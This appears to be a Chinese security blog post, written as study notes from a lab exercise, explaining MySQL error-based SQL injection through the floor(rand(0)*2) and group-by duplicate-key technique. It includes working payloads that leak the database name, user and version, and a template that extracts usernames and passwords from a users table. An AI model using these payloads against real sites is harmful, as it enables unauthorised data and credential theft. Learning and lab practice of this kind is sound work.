
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>再探SQL报错注入 - hybcx's blog</title>

  
    <meta name="description" content="0x01 前言 本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。 0x02 rand和order by报错注入 一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句 RAND() in a WHERE clause is re-evaluated every time the WHERE">
<meta property="og:type" content="article">
<meta property="og:title" content="再探SQL报错注入">
<meta property="og:url" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 前言 本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。 0x02 rand和order by报错注入 一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句 RAND() in a WHERE clause is re-evaluated every time the WHERE">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210526397.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210545841.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210918104.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215163639852.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215163654153.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215163957161.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215164013653.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215164151961.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165205920.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165453272.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165519117.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165845068.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215173228030.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215174048617.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215200129931.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215200406827.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215205452658.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215205541822.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210444287.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210703023.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210719431.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210857723.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215213109014.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215213135245.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215213832727.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215214058299.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215214043397.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215215446707.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215215519726.png">
<meta property="article:published_time" content="2023-12-14T12:37:44.065Z">
<meta property="article:modified_time" content="2024-02-03T01:42:57.115Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="基本知识">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210526397.png">
  
  
  
  <meta name="keywords" content="基本知识">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/26/flask-nei-cun-ma-xue-xi/"><span class="title">Flask内存马学习</span></a><a class="item title" href="/2024/06/01/seacms-dai-ma-shen-ji/"><span class="title">SeaCMS代码审计</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/01/ju-zhen-bei/"><span class="title">矩阵杯</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/29/bluecms-dai-ma-shen-ji/"><span class="title">BlueCMS代码审计</span></a><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/05/21/ciscn-2024wp/"><span class="title">CISCN-2024Wp</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">web知识总结</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-12-14T12:37:44.065Z">2023-12-14</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-03T01:42:57.115Z">2024-02-03</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>再探SQL报错注入</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-前言">0x01 前言</h1>
<p>本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。</p>
<h1 id="0x02-rand和order-by报错注入">0x02 rand和order by报错注入</h1>
<p>一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句</p>
<pre><code class="hljs plaintext">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.
译文：
每次执行 WHERE 时，都会重新计算 WHERE 子句中的 RAND()。不能在 ORDER BY 子句中使用带有 RAND() 值的列，因为 ORDER BY 会多次计算该列。</code></pre>
<p>也就是说不能作为order by的条件字段，group by同理，所以有如下payload：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">+</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">+</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">+</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span><span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))a<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>information_schema.tables<span class="hljs-operator">+</span><span class="hljs-keyword">group</span><span class="hljs-operator">+</span><span class="hljs-keyword">by</span><span class="hljs-operator">+</span>a)b<span class="hljs-comment">--</span></code></pre>
<p>其中a为:</p>
<pre><code class="hljs sql">concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))</code></pre>
<p>后面又group by a，所以会爆出</p>
<pre><code class="hljs plaintext">Duplicate entry ‘XXXXXXXXXX’ for key ‘group_key’
译文：
密钥“group_key”的条目“XXXXXXXXXX”重复</code></pre>
<p>其中XXXXX就是<code>0x5f,database(),0x5f,user(),0x5f,version()</code>的内容，这样一步步就能拿到想要的信息</p>
<p>在前面的payload中其实还有个很重要的函数是floor()取整，在之前的文章中研究过，floor(rand(0)*2)这样会产生重复的随机数，从而在order by时候报错。</p>
<p>接下来详细分析一波上述payload的原理：</p>
<h2 id="floor函数">Floor（）函数</h2>
<pre><code class="hljs plaintext">floor（），rand（），count（），group by联合使用：
floor（）：向下取整
rand（）：生成一个0-1之间的随机数，不包括0和1
count（*）：统计某个表下面一共有多少记录
group by XXX：按照一定的规则对XXX进行排序</code></pre>
<p>报错原理：group by和rand（）联合使用的时候，如果临时表中没有该主键，则再插入的之前会再计算一次rand（），然后再由group by将计算出来的主键直接插入到临时表格之中，导致主键重复，然后报错。<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231214210526397.png" alt="image-20231214210526397"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231214210545841.png" alt="image-20231214210545841"></p>
<p>上述是这些函数的简单用法，以下不想费劲搭环境了，直接照搬师傅的了。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231214210918104.png" alt="image-20231214210918104"></p>
<p>在这里使用group by的时候回生成一张临时表，也叫做虚拟表，而且表都是有主键的，作为主键的列是不能由重复的，好比第一个值的主键为1，那么就不能再有主键为1的值了，接下来可以再是2、3…</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215163639852.png" alt="image-20231215163639852"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215163654153.png" alt="image-20231215163654153"></p>
<p>可以看到上述两幅图片中第二幅图片的序列明显更规律（也就是伪序列）</p>
<p>首先这是一个虚拟表，自然就有主键。当使用group by去读这些数据的时候，好比上面这个伪随机序列，读完第一列，发现主键之中没有0这个数字，但由于rand的存在，他不会立刻插入，而是会继续运算一次rand函数，然后经过floor之后0变成了1，随后率先插入的数字便成了1。然后取第二条数据，此时floor之后为数字1，但该虚拟表中已经有了1，则该数字1对应的值自增1，继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，由于表中不存在数字0，则继续rand一次，经过floor之后成了1，但根据特性，该数字1会硬插入该虚拟表中，导致了数字1的重复，最终报错</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215163957161.png" alt="image-20231215163957161"></p>
<p>这里是个例子，将user（）的位置换做别的，就可以显示出别的错误了。<br>
爆库：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215164013653.png" alt="image-20231215164013653"></p>
<p>可以看到使用的security，后面的数字1是rand（）函数产生的。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215164151961.png" alt="image-20231215164151961"></p>
<p>这里可以看到具体信息了。其实就是利用了count的统计与group by的合作，然后基于主键唯一的机制，然后造成了这个错误。</p>
<p>模板payload大致如下：</p>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)b;  #第一种

?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+  #第二种</span>
<span class="hljs-string"></span>
